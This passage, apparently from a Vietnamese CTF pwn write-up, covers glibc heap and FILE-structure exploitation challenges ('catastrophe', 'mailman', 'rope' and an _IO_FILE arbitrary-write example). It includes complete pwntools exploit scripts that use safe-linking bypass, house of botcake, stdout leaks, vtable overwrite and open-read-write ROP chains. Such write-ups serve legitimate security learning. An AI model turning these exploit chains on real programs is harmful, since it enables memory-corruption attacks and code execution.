  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebda8 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

FINALLY !!!

![here](/assets/images/finally.png)

full exp : 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./catastrophe_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

def malloc(idx,size,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'> ',f'{idx}'.encode())
    p.sendlineafter(b'> ',f'{size}'.encode())
    p.sendlineafter(b'content: ',data)

def free(idx):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'> ',f'{idx}'.encode())

def view(idx):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'> ',f'{idx}'.encode())
def obfuscate(p, adr):
    return p^(adr>>12)


for i in range(7): malloc(i,0x100,b'a')

free(0)
view(0)
heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000
log.info(f'heap base: {hex(heap_base)}')

malloc(0,0x100,b'a')

malloc(7,0x100,b'a')
malloc(8,0x100,b'a')

malloc(9,0x10,b'c')

for i in range(7): free(i)
free(7)
view(7)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
environ = libc.sym.environ
binsh = next(libc.search(b'/bin/sh\x00'))
stdout = libc.address + 0x21a780
log.info(f'libc: {hex(libc.address)}')
log.info(f'environ: {hex(environ)}')
log.info(f'binsh: {hex(binsh)}')
log.info(f'stdout: {hex(stdout)}')

free(8)
malloc(0,0x100,b'a')
free(8)
# overwrite fd
payload = b'a'*0x108 + p64(0x111) + p64(obfuscate(stdout,heap_base))
malloc(1,0x130,payload)
malloc(2,0x100,b'nothing')

payload = flat(
        0xfbad1800,
        libc.sym.environ,
        libc.sym.environ,
        libc.sym.environ,
        libc.sym.environ,
        libc.sym.environ+8,
        libc.sym.environ+8,
        libc.sym.environ+8,
        libc.sym.environ+8,
        )

malloc(3,0x100,payload)
environ_stack = u64(p.recv(6).ljust(8,b'\x00'))
saved_rbp = environ_stack - 0x138
saved_rip = environ_stack - 0x130
log.info(f'stack_leak: {hex(environ_stack)}')
log.info(f'saved_rbp: {hex(saved_rbp)}')
log.info(f'saved_rip: {hex(saved_rip)}')



input()
free(1)
free(2)

payload2 = flat(
        b'a'*0x108 + p64(0x111) + p64(obfuscate(saved_rbp,heap_base))
        )
pop_rsi = libc.address + 0x0000000000126101
pop_rdi = 0x000000000002a3e5
pop_rdx_rbx = libc.address + 0x0000000000090529

input()
payload3 = p64(heap_base+0x78)
payload3 += p64(pop_rsi) + p64(0)
payload3 += p64(pop_rdx_rbx) + p64(0)*2
payload3 += p64(0xebcf8+libc.address)  #rsi null , rdx null
malloc(5,0x130,payload2)
malloc(6,0x100,b'nothing')
malloc(7,0x100,payload3)

p.interactive()
```

ref : 

[1 bài kĩ thuật tương tự](https://ret2school.github.io/post/mailman/)

[1 writeup khác](https://zenn.dev/t0m3y/articles/d42397182c694d#fsop)

[safe_linking](https://fascinating-confusion.io/posts/2020/11/csr20-howtoheap-writeup/)



## mailman


- 1 bài heap kết hợp seccomp  

### overview

- đầu tiên ta có thể thấy nó setup ```seccomp``` ta sẽ check nó sau , tiếp theo ta có 3 option ```write , send and read```

```cs
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  void *ptr; // rax
  int choice; // [rsp+Ch] [rbp-24h] BYREF
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  __int64 v6; // [rsp+18h] [rbp-18h]
  __int64 v7; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v6 = seccomp_init(0LL, argv, envp);
  seccomp_rule_add(v6, 2147418112LL, 2LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 0LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 1LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 5LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 60LL, 0LL);
  seccomp_load(v6);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("Welcome to the post office.");
  puts("Enter your choice below:");
  puts("1. Write a letter");
  puts("2. Send a letter");
  puts("3. Read a letter");
  while ( 1 )
  {
    while ( 1 )
    {
      printf("> ");
      __isoc99_scanf("%d%*c", &choice);
      if ( choice != 3 )
        break;
      v7 = inidx();
      puts(*((const char **)&mem + v7));
    }
    if ( choice > 3 )
      break;
    if ( choice == 1 )
    {
      v7 = inidx();
      printf("letter size: ");
      __isoc99_scanf("%lu%*c", &size);
      ptr = malloc(size);
      *((_QWORD *)&mem + v7) = ptr;
      printf("content: ");
      fgets(*((char **)&mem + v7), size, stdin);
    }
    else
    {
      if ( choice != 2 )
        break;
      v7 = inidx();
      free(*((void **)&mem + v7));
    }
  }
  puts("Invalid choice!");
  _exit(0);
}
```

- seccomp : 

ta sẽ chỉ có thể dùng orw ở bài này 

```cscs
ploi@PhuocLoiiiii:~/pwn/FSOP/imaginary$ seccomp-tools dump ./vuln_patched
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010
 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

- option1 : writewrite

nhập 1 size và gọi malloc(size)  , tiếp theo là nhập dữ liệu vào chunk

```cs
 if ( choice == 1 )
    {
      v7 = inidx();
      printf("letter size: ");
      __isoc99_scanf("%lu%*c", &size);
      ptr = malloc(size);
      *((_QWORD *)&mem + v7) = ptr;
      printf("content: ");
      fgets(*((char **)&mem + v7), size, stdin);
```

- option2 : send

nhập 1 idx và free chunk[idx]

```cs
   if ( choice != 2 )
        break;
      v7 = inidx();
      free(*((void **)&mem + v7));
```

- option3 : read

ta sẽ được đọc dữ liệu tại chunk 

```cs
 if ( choice != 3 )
        break;
      v7 = inidx();
      puts(*((const char **)&mem + v7));
```

### EXPLOIT

- ta sẽ có bug ```UAF``` ở option 3 , libc version được sử dụng ở bài này là ```2.35``` đây là 1 phiên bản không còn sử dung ```hook``` được nữa , cùng với setup ```seccomp``` khiến ta chỉ có thể ```orw``` để đọc flag 

- trước hết ta sẽ setup 1 số hàm để giúp khai thác rõ ràng hơn: 

```cs
def malloc(idx,size,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter((b'idx: ',f'{idx}'.encode()))
    p.sendlineafter(b'size: ',f'{size}'.encode())
    p.sendlineafter(b'content: ',data)

def free(idx):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'idx: ',f'{idx}'.encode())
def view(idx):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'idx: ',f'{idx}'.encode())
```

- trước hết ta sẽ cần leak libc và heap_address , leak ```heap``` vì 2.35 sử dụng ```safe_linking``` :

```cs
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

- vì bug ```uaf``` và hàm read cũng không check gì nên ta có thể leak libc và heap dễ dàng như sau: 

```cs
for i in range(7): malloc(i,0x100,b'')

free(0)
view(0)

heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000 - 0x2000
log.info(f'heap_base: {hex(heap_base)}')
```
- tuy nhiên trong bins lúc này khá lộn xộn , ```tcache``` là 1 mảng dslk lưu trữ các chunk được giải phóng trên cơ sở mỗi luồng , các dslk dược lập chỉ mục theo thứ tự theo các chunk từ 16-1032 byte . tuy nhiên seccomp đã phân bổ và giải phóng rất nhiều bộ nhớ trước đó nên nó xảy ra sự lộn xộn này 

```cs
pwndbg> bins
tcachebins
0x20 [  7]: 0x55555555cfd0 —▸ 0x55555555d280 —▸ 0x55555555c750 —▸ 0x55555555ce30 —▸ 0x55555555cc90 —▸ 0x55555555caf0 —▸ 0x55555555c6c0 ◂— 0
0x70 [  6]: 0x55555555cb30 —▸ 0x55555555ccd0 —▸ 0x55555555ce70 —▸ 0x55555555d010 —▸ 0x55555555d190 —▸ 0x55555555c6e0 ◂— 0
0x80 [  7]: 0x55555555c8f0 —▸ 0x55555555ca70 —▸ 0x55555555cc10 —▸ 0x55555555cdb0 —▸ 0x55555555cf50 —▸ 0x55555555d200 —▸ 0x55555555c640 ◂— 0
0xd0 [  5]: 0x55555555c170 —▸ 0x55555555be40 —▸ 0x55555555bb10 —▸ 0x55555555b7e0 —▸ 0x55555555b350 ◂— 0
0xf0 [  2]: 0x55555555d080 —▸ 0x55555555c370 ◂— 0
fastbins
0x20: 0x55555555c490 —▸ 0x55555555c5a0 —▸ 0x55555555c8c0 —▸ 0x55555555c960 —▸ 0x55555555cb00 —▸ 0x55555555cca0 —▸ 0x55555555ce40 —▸ 0x55555555cfe0 ◂— ...
0x70: 0x55555555d290 —▸ 0x55555555c4b0 —▸ 0x55555555c5c0 —▸ 0x55555555c7d0 —▸ 0x55555555ced0 —▸ 0x55555555cd30 —▸ 0x55555555cb90 —▸ 0x55555555c9f0 ◂— ...
0x80: 0x55555555c520 —▸ 0x55555555c840 ◂— 0
unsortedbin
empty
smallbins
empty
largebins
empty
```

- tiếp theo ta lại sử dụng ```house_of_botcake``` để có được đọc và ghi tùy ý (đọc lại bài trước để xem kĩ hơn)

- ta sẽ malloc 7 chunk , 2 chunk tiếp theo cho việc gộp chunk và 1 chunk tránh gộp chunk : 

cái for 20 đó là mình muốn dẹp sạch mấy thằng trong bins =)))

```cs
malloc(0,0x100,b'')
malloc(7,0x100,b'')
malloc(8,0x100,b'')


for i in range(7): free(i)
for i in range(20): malloc(9,0x10,b'flag.txt\0')

free(8)

view(8)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
log.info(f'libc: {hex(libc.address)}')
log.info(f'stdout: {hex(libc.address+0x21a780)}')

free(7)
```

- lúc này việc gộp chunk hoàn tất , ta sẽ malloc để tcache lấy đi 1 chunk và free() chunk thứ 8 vào , để khi ta malloc chunk thứ 7 ta có thể overwrite ```fd``` chunk thứ 8

```cs
malloc(0,0x100,b'')
free(8)

payload = b'a'*0x108 + p64(0x111) + p64(libc.address+0x21a780 ^ (heap_base+0x2b90>>12))
malloc(1,0x130,payload)
```

- tiếp theo là ```leak_stack``` cho việc sử dụng ```rop_chain``` orw để lấy flag , tuy nhiên ở đây nó sử dụng ```_exit()``` ở main nên ta có thể overwrite ```saved_rip``` của ```fgets``` hoặc ```printf``` chẵn hạn , ở đây mình chọn ```fgets``` vì sau khi input()  xong thì nó return về ```rop_chain``` của mình luôn

- saved_rbp_fgets ở đây thực ra nó không phải là ```saved_rbp``` của fgets , lúc đầu mình tính toán như vậy nhưng malloc() nó cần địa chỉ ```alignment``` nên mình debug dần và sửa lạilại

```cs
malloc(2,0x100,b'nothing')
'''
payload2 = flat(
        0xfbad1800, # _flags
        libc.sym.environ, # _IO_read_ptr
        libc.sym.environ, # _IO_read_end
        libc.sym.environ, # _IO_read_base
        libc.sym.environ, # _IO_write_base
        libc.sym.environ + 0x8, # _IO_write_ptr
        libc.sym.environ + 0x8, # _IO_write_end
        libc.sym.environ + 0x8, # _IO_buf_base
        libc.sym.environ + 8, # _IO_buf_end
        )
'''
payload2 = p64(0xfbad1800) + p64(libc.sym.environ)*4 + p64(libc.sym.environ+8)*4
print(payload2)
malloc(3,0x100,payload2)

stack_leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'stack: {hex(stack_leak)}')

saved_rbp_fgets = stack_leak - (0x188)
```

- cuối cùng là free() 2 chunk lúc nãy và dùng rop_chain lấy flag ^^

exp: 


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process()

def malloc(idx,size,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'idx: ',f'{idx}'.encode())
    p.sendlineafter(b'size: ',f'{size}'.encode())
    p.sendlineafter(b'content: ',data)

def free(idx):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'idx: ',f'{idx}'.encode())
def view(idx):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'idx: ',f'{idx}'.encode())

for i in range(7): malloc(i,0x100,b'')

free(0)
view(0)

heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000 - 0x2000
log.info(f'heap_base: {hex(heap_base)}')

malloc(0,0x100,b'')
malloc(7,0x100,b'')
malloc(8,0x100,b'')


for i in range(7): free(i)
for i in range(20): malloc(9,0x10,b'flag.txt\0')

free(8)

view(8)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
log.info(f'libc: {hex(libc.address)}')
log.info(f'stdout: {hex(libc.address+0x21a780)}')

free(7)

malloc(0,0x100,b'')
free(8)

payload = b'a'*0x108 + p64(0x111) + p64(libc.address+0x21a780 ^ (heap_base+0x2b90>>12))
malloc(1,0x130,payload)
malloc(2,0x100,b'nothing')
'''
payload2 = flat(
        0xfbad1800, # _flags
        libc.sym.environ, # _IO_read_ptr
        libc.sym.environ, # _IO_read_end
        libc.sym.environ, # _IO_read_base
        libc.sym.environ, # _IO_write_base
        libc.sym.environ + 0x8, # _IO_write_ptr
        libc.sym.environ + 0x8, # _IO_write_end
        libc.sym.environ + 0x8, # _IO_buf_base
        libc.sym.environ + 8, # _IO_buf_end
        )
'''
payload2 = p64(0xfbad1800) + p64(libc.sym.environ)*4 + p64(libc.sym.environ+8)*4
print(payload2)
malloc(3,0x100,payload2)

stack_leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'stack: {hex(stack_leak)}')

saved_rbp_fgets = stack_leak - (0x188)
log.info(f'saved_rbp_fgets: {hex(saved_rbp_fgets)}')
pop_rsi = 0x000000000002be51+libc.address
pop_rdi = 0x000000000002a3e5 + libc.address
pop_rdx_rbx = 0x0000000000090529 + libc.address
pop_rax = 0x0000000000045eb0 + libc.address
syscall = 0x0000000000091396 + libc.address
free(8)
free(7)
payload = b'a'*0x108 + p64(0x111) + p64(saved_rbp_fgets ^ (heap_base+0x2b90>>12))
malloc(3,0x130,payload)
malloc(4,0x100,b'nothing')

rop_chain = b'./flag.txt\x00'
rop_chain = rop_chain.ljust(40,b'a')
# open(./flag.txt,0,0)
rop_chain += p64(pop_rdi) + p64(saved_rbp_fgets)
rop_chain += p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0)*2
rop_chain += p64(pop_rax) + p64(2) + p64(syscall)
# read(3,buf,size)
rop_chain += p64(pop_rdi) + p64(3) + p64(pop_rax) + p64(0)
rop_chain += p64(pop_rsi) + p64(saved_rbp_fgets) + p64(pop_rdx_rbx) + p64(0x100) + p64(0) + p64(syscall)
# write(1,buf,size)
rop_chain += p64(pop_rdi) + p64(1) + p64(pop_rax) + p64(1) + p64(syscall)
input()
malloc(5,0x100,rop_chain)

p.interactive()
```

![here](/assets/images/flag20.png)

ref : 

[here](https://ret2school.github.io/post/mailman/)

[here](https://surg.dev/ictf23/)

## rope

### overview

checksec: 

```c
ploi@PhuocLoiiiii:~/pwn/FSOP/imaginary-2022/rope$ checksec vuln
[*] '/home/ploi/pwn/FSOP/imaginary-2022/rope/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


- main: đây rõ ràng là 1 bài write-what-where , ta được leak địa chỉ ```libc``` và được ghi 8 bytes vào 1 địa chỉ nào đóđó

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD *v4; // [rsp+8h] [rbp-18h] BYREF
  _QWORD v5[2]; // [rsp+10h] [rbp-10h] BYREF

  v5[1] = __readfsqword(0x28u);
  printf("%p\n", &puts);
  fgets(inp, 256, stdin);
  __isoc99_scanf("%ld%*c", &v4);
  __isoc99_scanf("%ld%*c", v5);
  *v4 = v5[0];
  puts("ok");
  return 0;
}
```

### exploit

- libc ở bài này là 2.23 , đây là 1 phiên bản thấp tồn tại nhiều lỗ hổng , vì ```FULL_RELRO``` nên overwrite ```GOT``` sẽ không hữu ích , không những thế nó còn setup seccomp : 

và ta chỉ được orw 

```cs
ploi@PhuocLoiiiii:~/pwn/FSOP/imaginary-2022/rope$ seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

- ở bài này ta sẽ nghĩ đến overwrite ```vtable``` vì nó không check ở phiên bản 2.23 , ta sẽ cùng tìm hiểu nó: 

```c
#include "libioP.h"
#include <string.h>
#include <limits.h>

int _IO_puts(const char * str) {
    int result = EOF;
    _IO_size_t len = strlen(str);
    _IO_acquire_lock(_IO_stdout);

    if ((_IO_vtable_offset(_IO_stdout) != 0 ||
            _IO_fwide(_IO_stdout, -1) == -1) &&
        _IO_sputn(_IO_stdout, str, len) == len &&
        _IO_putc_unlocked('\n', _IO_stdout) != EOF)
        result = MIN(INT_MAX, len + 1);

    _IO_release_lock(_IO_stdout);
    return result;
}

#ifdef weak_alias
weak_alias (_IO_puts, puts)
#endif
```

- đầu tiên nó sẽ check ```_IO_vtable_offset```  , vậy ta sẽ xem xét nó: 

```c
#if _IO_JUMPS_OFFSET
# define _IO_JUMPS_FUNC(THIS)\
    ( * (struct _IO_jump_t ** )((void * ) & _IO_JUMPS_FILE_plus(THIS) \ +
        (THIS) -> _vtable_offset))
# define _IO_vtable_offset(THIS)(THIS) -> _vtable_offset
#else
# define _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus(THIS)
# define _IO_vtable_offset(THIS) 0
#endif
```

- với libc 2.24 thì nó như thế này: 

```c
#if _IO_JUMPS_OFFSET
# define _IO_JUMPS_FUNC(THIS)\
    (IO_validate_vtable( *(struct _IO_jump_t ** )((void * ) & _IO_JUMPS_FILE_plus(THIS)\ +
        (THIS) -> _vtable_offset) ))
# define _IO_vtable_offset(THIS)(THIS) -> _vtable_offset
#else
# define _IO_JUMPS_FUNC(THIS)(IO_validate_vtable(_IO_JUMPS_FILE_plus(THIS)))
# define _IO_vtable_offset(THIS) 0
#endif
```

- và ta thấy libc 2.23 hoàn toàn không có ```IO_validate_vtable``` , vì vậy ta hoàn toàn có thể ghi ```vtable``` của ```stdout```

```c
gef> x/20xg 0x7ffff7dd2620
0x7ffff7dd2620 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007ffff7dd26a3
0x7ffff7dd2630 <_IO_2_1_stdout_+16>:    0x00007ffff7dd26a3      0x00007ffff7dd26a3
0x7ffff7dd2640 <_IO_2_1_stdout_+32>:    0x00007ffff7dd26a3      0x00007ffff7dd26a3
0x7ffff7dd2650 <_IO_2_1_stdout_+48>:    0x00007ffff7dd26a3      0x00007ffff7dd26a3
0x7ffff7dd2660 <_IO_2_1_stdout_+64>:    0x00007ffff7dd26a4      0x0000000000000000
0x7ffff7dd2670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd2680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7dd18e0
0x7ffff7dd2690 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
0x7ffff7dd26a0 <_IO_2_1_stdout_+128>:   0x0000000000000000      0x00007ffff7dd3780
0x7ffff7dd26b0 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
gef>
0x7ffff7dd26c0 <_IO_2_1_stdout_+160>:   0x00007ffff7dd17a0      0x0000000000000000
0x7ffff7dd26d0 <_IO_2_1_stdout_+176>:   0x0000000000000000      0x0000000000000000
0x7ffff7dd26e0 <_IO_2_1_stdout_+192>:   0x00000000ffffffff      0x0000000000000000
0x7ffff7dd26f0 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7dd06e0
```

- IO_file_jumps sẽ chứa các hàm thực thi để sử dụng 
```c
gef> x/20xg 0x00007ffff7dd06e0
0x7ffff7dd06e0 <__GI__IO_file_jumps>:   0x0000000000000000      0x0000000000000000
0x7ffff7dd06f0 <__GI__IO_file_jumps+16>:        0x00007ffff7a869d0      0x00007ffff7a87740
0x7ffff7dd0700 <__GI__IO_file_jumps+32>:        0x00007ffff7a874b0      0x00007ffff7a88610
0x7ffff7dd0710 <__GI__IO_file_jumps+48>:        0x00007ffff7a89990      0x00007ffff7a861f0
0x7ffff7dd0720 <__GI__IO_file_jumps+64>:        0x00007ffff7a85ed0      0x00007ffff7a854d0
0x7ffff7dd0730 <__GI__IO_file_jumps+80>:        0x00007ffff7a88a10      0x00007ffff7a85440
0x7ffff7dd0740 <__GI__IO_file_jumps+96>:        0x00007ffff7a85380      0x00007ffff7a7a190
0x7ffff7dd0750 <__GI__IO_file_jumps+112>:       0x00007ffff7a861b0      0x00007ffff7a85b80
0x7ffff7dd0760 <__GI__IO_file_jumps+128>:       0x00007ffff7a85980      0x00007ffff7a85350
0x7ffff7dd0770 <__GI__IO_file_jumps+144>:       0x00007ffff7a85b70      0x00007ffff7a89b00
gef>
0x7ffff7dd0780 <__GI__IO_file_jumps+160>:       0x00007ffff7a89b10      0x0000000000000000
```

- ta sẽ sử thay đổi vtable của ```puts``` xem nó thế nào: 

```c
gef> set *(long long int)0x00007ffff7dd06e8 = 0x41414141414141
```
 
- và ta thấy nó bị lỗi tại đây , vậy ta sẽ setup inp là địa chỉ main , sau đó thay đổi ```vtable``` thành ```inp-0x38``` để nó loop lại main

![here](/assets/images/check.png)


- lúc này vì ta nhảy về ```main+54``` nên nó sẽ không thay đổi rbp sau mỗi lần , ý tưởng của ta sẽ là pivot về payload mà ta sẽ kiểm soát , trước hết ta cần ghi ```saved_rbp``` thứ hai vào (thứ mà ta có thể kiểm soát là payload của inp nên ta sẽ ghi vào địa chỉ của inp) 
- ở đây ta cần suy nghĩ , khi nó leave_ret thì nó sẽ nhảy về ```rbp+8``` đúng chứ? vậy nếu muốn nó nhảy về ```saved_rbp_2``` của ta vừa setup thì ta chỉ cần cần setup ```stdout+8``` sẽ là 1 leave_ret và nó sẽ nhảy đến ```inp```
- 1 điều nữa là ta cần tới 2 ```leave_ret``` , vì sao? vì khi nhảy về ```inp``` thì ta vừa ghi rồi , ta muốn nó jmp tới ```inp+8``` thì ta phải setup 1 leavet_ret nữa mới thành công , cuối cùng là 1 rop_chain orw thôi


exp: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

p = process()
p.recvuntil(b'0x')
libc.address = int(p.recvline()[:-1], 16) - libc.sym['puts']
log.info(hex(libc.address))
stdout = libc.address + 0x3c5620
stdout_IO_file_jumps = stdout + 0xd8

payload = p64(exe.sym['main'] + 54)
p.sendline(payload)

p.sendline(f'{stdout_IO_file_jumps}'.encode())
input()
p.sendline(f'{exe.sym["inp"]-0x38}'.encode())

payload = p64(exe.sym['main'] + 54)
p.sendline(payload)
p.sendline(f'{stdout}'.encode())
p.sendline(f'{exe.sym["inp"]}'.encode())

leave_ret = 0x00000000004013bc
pop_rax = 0x000000000003a738 + libc.address
pop_rdi = 0x0000000000021112 + libc.address
pop_rsi = 0x00000000000202f8 + libc.address
pop_rdx = 0x0000000000001b92 + libc.address
syscall = 0x00000000000bc3f5 + libc.address
rop = flat(
    pop_rax, 2,
    pop_rdi, 0x4040e0,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,

    pop_rdi, 3,
    pop_rsi, 0x404a00,
    pop_rdx, 0x100,
    libc.sym['read'],

    pop_rdi, 1,
    libc.sym['write'],
    b'flag.txt\x00'
    )
payload = p64(leave_ret) + rop
p.sendline(payload)
p.sendline(f'{stdout + 0x8}'.encode())
p.sendline(f'{leave_ret}'.encode())

p.interactive()
```

![here](/assets/images/flag30.png)


## _IO_FILE Arbitrary Address Write

- đây sẽ là 1 bài mẫu về ghi tùy ý 

- ta thấy đầu tiên nó sẽ mở 1 file và ```buf``` sẽ giữ fd của file này , tiếp theo ta được input vào ```buf``` và dùng ```fread``` để đọc dữ liệu từ ```buf``` vào ptr , cuối cùng là 1 đoạn check , biến này là 1 biến global và ta cần ghi nó với giá trị tương ứng 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *buf; // [rsp+8h] [rbp-418h]
  char ptr[1032]; // [rsp+10h] [rbp-410h] BYREF
  unsigned __int64 v6; // [rsp+418h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  buf = fopen("/etc/issue", "r");
  printf("Data: ");
  read(0, buf, 0x12CuLL);
  fread(ptr, 1uLL, 0x3FFuLL, buf);
  printf("%s", ptr);
  if ( overwrite_me == 0xDEADBEEF )
    read_flag();
  fclose(buf);
  return 0;
}
```

- bài này chỉ có 1 target duy nhất thôi vì vậy ta sẽ cùng đi tìm hiểu nó 

### tìm hiểu kĩ thuật 

- Các hàm tiêu biểu để đọc nội dung tệp là fread và fgets. Các hàm này gọi hàm _IO_file_xsgetn bên trong thư viện.

```c
_IO_size_t
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  _IO_size_t want, have;
  _IO_ssize_t count;
  _char *s = data;
  want = n;
    ...
      /* If we now want less than a buffer, underflow and repeat
         the copy.  Otherwise, _IO_SYSREAD directly to
         the user buffer. */
      if (fp->_IO_buf_base
          && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
        {
          if (__underflow (fp) == EOF)
        break;
          continue;
        }
    ...
}
```

- Hàm này kiểm tra xem n nhỏ hơn giá trị _IO_buf_end - _IO_buf_base hay không và gọi hàm __underflow() → _IO_new_file_underflow.

```c
int _IO_new_file_underflow (FILE *fp)
{
  ssize_t count;
  if (fp->_flags & _IO_NO_READS)           
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
   ...
   count = _IO_SYSREAD (fp, fp->_IO_buf_base,     
    fp->_IO_buf_end - fp->_IO_buf_base);
}
```

- Trong hàm _IO_new_file_underflow, kiểm tra xem biến _flags của con trỏ tệp có được cấp quyền đọc hay không.

```c
_IO_SYSREAD (fp, fp->_IO_buf_base,     
    fp->_IO_buf_end - fp->_IO_buf_base);
```

- Tiếp theo, truyền giá trị đã thực hiện phép toán với con trỏ tập tin và biến thành phần của cấu trúc tập tin vào tham số của hàm _IO_SYSREAD.

Hàm _IO_SYSREAD có thể xác nhận thông qua định nghĩa macro là _IO_file_read() trong bảng ảo (vtable).

```c
read(f->_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base);
```

- cuối cùng ta cần setup 3 thằng ở trên để có thể ghi tùy ý 


### EXPLOIT

ta có thể xem _IO_FILE struct ở đây : 


```c
/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
